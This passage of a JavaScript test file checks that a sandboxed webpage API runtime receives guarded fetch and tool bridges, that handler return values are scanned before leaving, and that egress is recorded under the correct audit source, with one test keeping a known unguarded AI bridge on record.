            buildOwnerSession: async () => ({ user: { id: 'owner', organizationId: 'org1' } }),
        },
    });
    assert.strictEqual(seen[0].egress.source, 'studio_app');
    assert.strictEqual(seen[0].egress.ids.organization_id, 'org1');
    assert.strictEqual(seen[0].egress.ids.user_id, 'owner');
    assert.strictEqual(seen[0].egress.ids.agent_name, 'App: Klanten');
});

// ── the webpages light tier: the same sandbox, its own bridges ──────────────
//
// What those bridges DO is pinned beside them in
// core/webpages/webpageEgress.test.js; what this file is for is making sure a
// route out cannot go missing from the register again — which is exactly how
// the code step's header and response holes survived a rewrite of everything
// around them. So the handler is RUN, with the isolate replaced by a recorder,
// and the three bridges it is handed are read off the call.

const fs = require('node:fs');
const path = require('node:path');
const SERVER = path.resolve(__dirname, '../..');
const read = (rel) => fs.readFileSync(path.join(SERVER, rel), 'utf8');

test('webpages: the api runtime does not hand the sandbox an unguarded fetch', async () => {
    const swapWebpage = (rel, exports) => {
        const file = require.resolve(path.join(SERVER, rel));
        const prev = require.cache[file];
        require.cache[file] = { id: file, filename: file, loaded: true, exports, children: [], paths: [] };
        return () => { if (prev) require.cache[file] = prev; else delete require.cache[file]; };
    };
    const realSandbox = require(path.join(SERVER, 'automation/codeSandbox'));
    const realEgress = require(path.join(SERVER, 'core/webpages/webpageEgress'));
    const calls = { http: [], tool: [], guarded: [] };
    let bridges = null;
    const undo = [
        swapWebpage('automation/codeSandbox', {
            isAvailable: () => true,
            defaultFetchHttp: realSandbox.defaultFetchHttp,
            runCode: async (opts) => { bridges = opts.bridges; return { result: { rows: [{ naam: 'Jan Jansen' }] } }; },
        }),
        swapWebpage('core/webpages/webpageEgress', {
            ...realEgress,
            resolveWebpagePolicy: async () => ({ policy: 'test' }),
            makeToolBridge: (...a) => { calls.tool.push(a); return function guardedTool() {}; },
            makeHttpBridge: (...a) => { calls.http.push(a); return function guardedHttp() {}; },
            guardWebpageResult: async (_session, result) => { calls.guarded.push(result); return result; },
        }),
        swapWebpage('stores/webpageStore', {
            readExtraFile: async () => ({ text: 'export function main(){ return {}; }', meta: { isText: true } }),
        }),
        swapWebpage('stores/webpageDbStore', { query: async () => [], exec: async () => ({}), batch: async () => ({}) }),
        swapWebpage('core/webpages/webpageBridgeAuth', {
            loadAuthorContext: async () => ({
                authorUserId: 'u1', authorOrgId: 'org1', authorSession: {},
                webpage: { title: 'Klantenlijst' }, bridgeGrants: { integrations: [] },
            }),
        }),
    ];
    delete require.cache[require.resolve(path.join(SERVER, 'integrations/webpageApiRuntime'))];
    try {
        const { executeApiHandler } = require(path.join(SERVER, 'integrations/webpageApiRuntime'));
        await executeApiHandler({ webpageId: 'wp1', route: 'api/klanten', req: { method: 'GET' } });

        assert.ok(bridges, 'the handler reached the sandbox');
        assert.notStrictEqual(bridges.fetchHttp, realSandbox.defaultFetchHttp,
            'webpageApiRuntime passes defaultFetchHttp straight to the isolate again — that is '
            + 'the raw HTTPS/SSRF layer with no PII scan and no ledger row, in a product sold on '
            + '"personal data does not leave Bee Flow"');
        assert.strictEqual(bridges.fetchHttp.name, 'guardedHttp', 'the fetch the isolate gets is the guarded one');
        assert.strictEqual(calls.http[0][1].rawFetch, realSandbox.defaultFetchHttp,
            'and the guard wraps that raw layer rather than replacing it');
        assert.strictEqual(bridges.executeTool.name, 'guardedTool', 'the dispatch is wrapped too');
        assert.deepStrictEqual(calls.guarded, [{ rows: [{ naam: 'Jan Jansen' }] }],
            'the RETURN VALUE is the widest way out and the one no bridge sees — it is scanned as well');
    } finally {
        for (const u of undo) u();
        delete require.cache[require.resolve(path.join(SERVER, 'integrations/webpageApiRuntime'))];
    }
});

test('webpages: its egress is filed under its own source, not as an automation', () => {
    // A webpage handler logged as `source: 'automation'` corrupts the audit trail,
    // which is a compliance surface rather than a label.
    const { WEBPAGE_SOURCE } = require('../webpages/webpageEgress');
    assert.strictEqual(WEBPAGE_SOURCE, 'webpage_api');
    // buildAuditBase must still DEFAULT to 'automation', or every existing caller
    // silently changes what it writes. The REAL one, briefly: this file mocks
    // ./safety to record what the engine hands it, and the default is the one
    // thing a recorder cannot answer.
    const safetyPath = require.resolve('./safety');
    const recorder = require.cache[safetyPath];
    delete require.cache[safetyPath];
    try {
        const { buildAuditBase } = require('./safety');
        const ctx = { orgId: 'org1', userId: 'u1', automationId: 'a1', runId: 'r1' };
        assert.strictEqual(buildAuditBase(ctx, { id: 's1' }).source, 'automation');
        assert.strictEqual(buildAuditBase(ctx, { id: 's1' }, { source: WEBPAGE_SOURCE }).source, 'webpage_api');
    } finally {
        require.cache[safetyPath] = recorder;
    }
});

test('KNOWN GAP: the webpages AI bridge is still unguarded, and stays written down', () => {
    // routes/webpagesPreview.js sends page content to a model. It records spend
    // (`source: 'webpage_bridge_ai'`) but no egress guard and no ledger row.
    // This test does not demand a fix — it fails if someone fixes it and
    // forgets the register, or deletes the route and leaves the note.
    const src = read('routes/webpagesPreview.js');
    assert.match(src, /webpage_bridge_ai/, 'the AI bridge moved — update the register in this file');
    const guarded = /guardToolInput|guardAiInput|prepareForEgress/.test(src);
    assert.strictEqual(guarded, false,
        'the webpages AI bridge now guards its egress — good. Update the register table at the '
        + 'top of this file and replace this test with real coverage.');
});
